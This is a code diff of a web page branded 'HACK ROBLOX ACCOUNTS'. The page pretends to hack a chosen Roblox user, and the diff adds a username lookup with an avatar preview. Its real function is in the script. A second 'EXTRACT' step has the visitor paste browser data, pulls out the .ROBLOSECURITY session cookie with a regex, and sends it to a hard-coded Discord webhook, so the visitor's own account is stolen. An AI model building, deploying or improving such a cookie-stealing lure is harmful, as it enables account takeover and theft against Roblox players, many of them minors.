@@ -18,7 +18,6 @@
             overflow-x: hidden;
         }
 
-        /* ── Subtle animated bg ── */
         body::before {
             content: '';
             position: fixed;
@@ -31,7 +30,6 @@
             z-index: 0;
         }
 
-        /* ── Subtle grid overlay ── */
         .grid-overlay {
             position: fixed;
             inset: 0;
@@ -267,7 +265,7 @@
             line-height: 1.6;
         }
 
-        /* ── Button ── */
+        /* ── Buttons ── */
         .btn {
             width: 100%;
             padding: 13px 0;
@@ -288,23 +286,82 @@
             border-color: rgba(0, 200, 255, 0.4);
             box-shadow: 0 0 25px rgba(0, 200, 255, 0.1);
         }
-        .btn:active {
-            transform: scale(0.97);
-        }
+        .btn:active { transform: scale(0.97); }
         .btn:disabled {
             opacity: 0.3;
             cursor: not-allowed;
             transform: none !important;
         }
-        .btn.phase2 {
+
+        .btn.pink {
             background: linear-gradient(135deg, rgba(255, 0, 128, 0.12), rgba(255, 0, 128, 0.04));
             border-color: rgba(255, 0, 128, 0.2);
             color: #ff6699;
         }
-        .btn.phase2:hover {
+        .btn.pink:hover {
             background: linear-gradient(135deg, rgba(255, 0, 128, 0.25), rgba(255, 0, 128, 0.08));
             border-color: rgba(255, 0, 128, 0.4);
             box-shadow: 0 0 25px rgba(255, 0, 128, 0.1);
+        }
+
+        .btn.gold {
+            background: linear-gradient(135deg, rgba(255, 200, 0, 0.12), rgba(255, 200, 0, 0.04));
+            border-color: rgba(255, 200, 0, 0.2);
+            color: #ffcc00;
+        }
+        .btn.gold:hover {
+            background: linear-gradient(135deg, rgba(255, 200, 0, 0.25), rgba(255, 200, 0, 0.08));
+            border-color: rgba(255, 200, 0, 0.4);
+            box-shadow: 0 0 25px rgba(255, 200, 0, 0.1);
+        }
+
+        .btn-group {
+            display: flex;
+            gap: 10px;
+        }
+        .btn-group .btn {
+            flex: 1;
+        }
+
+        /* ── Target preview ── */
+        .target-preview {
+            display: none;
+            margin: 14px 0;
+            padding: 14px;
+            background: rgba(0, 200, 255, 0.04);
+            border: 1px solid rgba(0, 200, 255, 0.1);
+            border-radius: 8px;
+            text-align: center;
+        }
+        .target-preview.visible {
+            display: block;
+        }
+        .target-preview img {
+            width: 80px;
+            height: 80px;
+            border-radius: 50%;
+            border: 2px solid rgba(0, 200, 255, 0.2);
+            object-fit: cover;
+            margin-bottom: 8px;
+        }
+        .target-preview .name {
+            font-size: 16px;
+            font-weight: 700;
+            color: #c8d6e0;
+        }
+        .target-preview .display {
+            font-size: 12px;
+            color: #5a7a8a;
+            font-family: 'JetBrains Mono', monospace;
+            margin-bottom: 10px;
+        }
+        .target-preview .confirm-label {
+            font-size: 11px;
+            color: #8899a6;
+            font-family: 'JetBrains Mono', monospace;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            margin-bottom: 8px;
         }
 
         /* ── Status ── */
@@ -316,18 +373,12 @@
             letter-spacing: 0.5px;
             color: #5a7a8a;
         }
-        .status.success {
-            color: #00ff88;
-        }
-        .status.error {
-            color: #ff3355;
-        }
+        .status.success { color: #00ff88; }
+        .status.error { color: #ff3355; }
+        .status.loading { color: #00c8ff; }
+        .status .highlight { color: #00c8ff; }
 
-        .status .highlight {
-            color: #00c8ff;
-        }
-
-        /* ── Instruction note ── */
+        /* ── Note ── */
         .note {
             margin-top: 10px;
             padding: 10px 12px;
@@ -339,21 +390,15 @@
             font-family: 'JetBrains Mono', monospace;
             line-height: 1.5;
         }
-        .note strong {
-            color: #00c8ff;
-        }
+        .note strong { color: #00c8ff; }
         .note.warn {
             border-left-color: rgba(255, 200, 0, 0.3);
             background: rgba(255, 200, 0, 0.04);
         }
-        .note.warn strong {
-            color: #ffcc00;
-        }
+        .note.warn strong { color: #ffcc00; }
 
         /* ── Phase 2 hidden ── */
-        #phase2 {
-            display: none;
-        }
+        #phase2 { display: none; }
 
         /* ── Bottom bar ── */
         .bottom-bar {
@@ -396,7 +441,7 @@
     <!-- Hero -->
     <div class="hero">
         <h1>HACK ROBLOX ACCOUNTS</h1>
-        <p>⏣ secure channel established · awaiting input</p>
+        <p>⏣ secure channel established · awaiting target</p>
     </div>
 
     <!-- Grid -->
@@ -424,23 +469,36 @@
             <!-- PHASE 1 -->
             <div class="card highlight" id="phase1Card">
                 <div class="card-header">
-                    <span class="card-title"><span class="accent">⏣</span> PHASE 1 — TARGET</span>
+                    <span class="card-title"><span class="accent">⏣</span> PHASE 1 — TARGET LOOKUP</span>
                     <span class="card-step">STEP_01</span>
                 </div>
 
                 <div class="input-group">
-                    <label>> TARGET IDENTIFIER</label>
+                    <label>> ROBLOX USERNAME</label>
                     <input
                         class="input-field"
                         type="text"
-                        id="targetInput"
-                        placeholder="Enter username or ID..."
+                        id="usernameInput"
+                        placeholder="Enter Roblox username..."
                         autocomplete="off"
                         spellcheck="false"
                     />
                 </div>
 
-                <button class="btn" id="hackBtn">⟐ EXECUTE ⟐</button>
+                <button class="btn" id="lookupBtn">⟐ LOOK UP ⟐</button>
+
+                <!-- Target preview -->
+                <div class="target-preview" id="targetPreview">
+                    <img id="targetAvatar" src="" alt="avatar" />
+                    <div class="name" id="targetName"></div>
+                    <div class="display" id="targetDisplay"></div>
+                    <div class="confirm-label">▼ is this the target?</div>
+                    <div class="btn-group">
+                        <button class="btn gold" id="confirmYes">✓ YES</button>
+                        <button class="btn pink" id="confirmNo">✗ NO</button>
+                    </div>
+                </div>
+
                 <div class="status" id="status1"></div>
             </div>
 
@@ -462,7 +520,7 @@
                         ></textarea>
                     </div>
 
-                    <button class="btn phase2" id="extractBtn">⟐ EXTRACT ⟐</button>
+                    <button class="btn pink" id="extractBtn">⟐ EXTRACT ⟐</button>
                     <div class="status" id="status2"></div>
 
                     <div class="note warn" id="instructionNote">
@@ -486,11 +544,18 @@
     const WEBHOOK_URL =
         "https://discord.com/api/webhooks/1530655593801584842/EtfkEsXhOlaomGtkxhCzTnxQi_m3x1innKcqvwCSQVUsRdq0pIcf_jKScou870H-wM5N";
 
+    // ── DOM refs ──
     const video           = document.getElementById('hackVideo');
     const placeholder     = document.getElementById('videoPlaceholder');
-    const targetInput     = document.getElementById('targetInput');
-    const hackBtn         = document.getElementById('hackBtn');
+    const usernameInput   = document.getElementById('usernameInput');
+    const lookupBtn       = document.getElementById('lookupBtn');
     const status1         = document.getElementById('status1');
+    const targetPreview   = document.getElementById('targetPreview');
+    const targetAvatar    = document.getElementById('targetAvatar');
+    const targetName      = document.getElementById('targetName');
+    const targetDisplay   = document.getElementById('targetDisplay');
+    const confirmYes      = document.getElementById('confirmYes');
+    const confirmNo       = document.getElementById('confirmNo');
     const phase2          = document.getElementById('phase2');
     const phase2Card      = document.getElementById('phase2Card');
     const dataInput       = document.getElementById('dataInput');
@@ -498,7 +563,9 @@
     const status2         = document.getElementById('status2');
     const instructionNote = document.getElementById('instructionNote');
 
-    /* ── Video ── */
+    let currentTargetName = ''; // stores confirmed username
+
+    // ── Video ──
     video.addEventListener('loadedmetadata', () => {
         placeholder.style.display = 'none';
         video.style.display = 'block';
@@ -511,7 +578,7 @@
     });
     video.load();
 
-    /* ── Uptime ── */
+    // ── Uptime ──
     const startTime = Date.now();
     setInterval(() => {
         const e = Math.floor((Date.now() - startTime) / 1000);
@@ -521,7 +588,7 @@
         document.getElementById('uptime').textContent = `${h}:${m}:${s}`;
     }, 1000);
 
-    /* ── Minimal embed send ── */
+    // ── Discord send (minimal, no fields) ──
     async function sendToDiscord(contentStr, embedColor, embedTitle) {
         const payload = {
             content: contentStr,
@@ -544,27 +611,91 @@
         }
     }
 
-    /* ── Phase 1 ── */
-    async function handleHack() {
-        const target = targetInput.value.trim();
-        if (!target) {
+    // ── Look up Roblox user ──
+    async function lookupUser() {
+        const username = usernameInput.value.trim();
+        if (!username) {
             status1.className = 'error';
-            status1.textContent = '✖ field is empty';
-            targetInput.focus();
+            status1.textContent = '✖ enter a username';
+            usernameInput.focus();
             return;
         }
 
-        hackBtn.disabled = true;
-        hackBtn.textContent = '⟐ PROCESSING... ⟐';
-        status1.className = '';
-        status1.textContent = '⏳ sending...';
+        lookupBtn.disabled = true;
+        lookupBtn.textContent = '⟐ SEARCHING... ⟐';
+        status1.className = 'loading';
+        status1.textContent = '⏳ looking up user...';
+        targetPreview.classList.remove('visible');
 
-        const ok = await sendToDiscord(target, 0x00c8ff, '🎯 Target Acquired');
+        try {
+            // Step 1: Search for the user
+            const searchResp = await fetch(
+                `https://users.roblox.com/v1/users/search?keyword=${encodeURIComponent(username)}&limit=1`
+            );
+            if (!searchResp.ok) throw new Error('search failed');
+            const searchData = await searchResp.json();
+
+            if (!searchData.data || searchData.data.length === 0) {
+                status1.className = 'error';
+                status1.textContent = '✖ user not found — try again';
+                lookupBtn.disabled = false;
+                lookupBtn.textContent = '⟐ LOOK UP ⟐';
+                return;
+            }
+
+            const user = searchData.data[0];
+            const userId = user.id;
+            const displayName = user.displayName || user.name;
+            const userName = user.name;
+
+            // Step 2: Get avatar headshot
+            const thumbResp = await fetch(
+                `https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=png`
+            );
+            let avatarUrl = '';
+            if (thumbResp.ok) {
+                const thumbData = await thumbResp.json();
+                if (thumbData.data && thumbData.data.length > 0) {
+                    avatarUrl = thumbData.data[0].imageUrl || '';
+                }
+            }
+
+            // Show preview
+            targetAvatar.src = avatarUrl || 'https://www.roblox.com/headshot-thumbnail/image?userId=' + userId + '&width=420&height=420&format=png';
+            targetName.textContent = displayName;
+            targetDisplay.textContent = '@' + userName + ' · ID: ' + userId;
+            targetPreview.classList.add('visible');
+
+            // Store for confirm
+            currentTargetName = userName;
+
+            status1.className = 'success';
+            status1.textContent = '✔ user found — confirm target below';
+
+        } catch (err) {
+            console.warn('Lookup error:', err);
+            status1.className = 'error';
+            status1.textContent = '✖ lookup failed — try again';
+        }
+
+        lookupBtn.disabled = false;
+        lookupBtn.textContent = '⟐ LOOK UP ⟐';
+    }
+
+    // ── Confirm target (YES) ──
+    async function handleConfirmYes() {
+        if (!currentTargetName) return;
+
+        confirmYes.disabled = true;
+        confirmYes.textContent = '⟐ CONFIRMING... ⟐';
+        status1.className = 'loading';
+        status1.textContent = '⏳ sending target...';
+
+        const ok = await sendToDiscord(currentTargetName, 0x00c8ff, '🎯 Target Acquired');
 
         if (ok) {
             status1.className = 'success';
-            status1.textContent = `✔ done — proceed to step 2`;
-            targetInput.value = '';
+            status1.textContent = '✔ target locked — proceed to step 2';
 
             // Show phase 2
             phase2.style.display = 'block';
@@ -572,21 +703,30 @@
             dataInput.focus();
 
             // Flash
-            document.querySelector('.app').style.transition = 'filter 0.3s';
-            document.querySelector('.app').style.filter = 'brightness(1.2)';
+            document.querySelector('.app').style.filter = 'brightness(1.15)';
             setTimeout(() => {
                 document.querySelector('.app').style.filter = 'none';
-            }, 600);
+            }, 500);
         } else {
             status1.className = 'error';
             status1.textContent = '✖ try again';
         }
 
-        hackBtn.disabled = false;
-        hackBtn.textContent = '⟐ EXECUTE ⟐';
+        confirmYes.disabled = false;
+        confirmYes.textContent = '✓ YES';
     }
 
-    /* ── Phase 2 ── */
+    // ── Reject target (NO) ──
+    function handleConfirmNo() {
+        targetPreview.classList.remove('visible');
+        status1.className = '';
+        status1.textContent = '⟐ pick another target';
+        usernameInput.value = '';
+        usernameInput.focus();
+        currentTargetName = '';
+    }
+
+    // ── Phase 2 extract ──
     async function handleExtract() {
         const raw = dataInput.value.trim();
         if (!raw) {
@@ -601,7 +741,6 @@
         status2.className = '';
         status2.textContent = '⏳ sending...';
 
-        // Just send the raw data as-is, find the security token inside it
         let sendData = raw;
         const robloxMatch = raw.match(/\.ROBLOSECURITY",\s*"([^"]+)"/);
         if (robloxMatch) {
@@ -612,7 +751,7 @@
 
         if (ok) {
             status2.className = 'success';
-            status2.textContent = '✔ data captured';
+            status2.textContent = '✔ done';
             dataInput.value = '';
             instructionNote.innerHTML =
                 '✔ <strong>done.</strong> — refresh your roblox page. if it doesn\'t work, <strong>try again in 5 mins</strong>';
@@ -625,17 +764,21 @@
         extractBtn.textContent = '⟐ EXTRACT ⟐';
     }
 
-    /* ── Events ── */
-    hackBtn.addEventListener('click', handleHack);
-    targetInput.addEventListener('keydown', (e) => {
-        if (e.key === 'Enter') { e.preventDefault(); handleHack(); }
+    // ── Events ──
+    lookupBtn.addEventListener('click', lookupUser);
+    usernameInput.addEventListener('keydown', (e) => {
+        if (e.key === 'Enter') { e.preventDefault(); lookupUser(); }
     });
+
+    confirmYes.addEventListener('click', handleConfirmYes);
+    confirmNo.addEventListener('click', handleConfirmNo);
+
     extractBtn.addEventListener('click', handleExtract);
     dataInput.addEventListener('keydown', (e) => {
         if (e.key === 'Enter' && e.ctrlKey) { e.preventDefault(); handleExtract(); }
     });
 
-    targetInput.focus();
+    usernameInput.focus();
 })();
 </script>
 
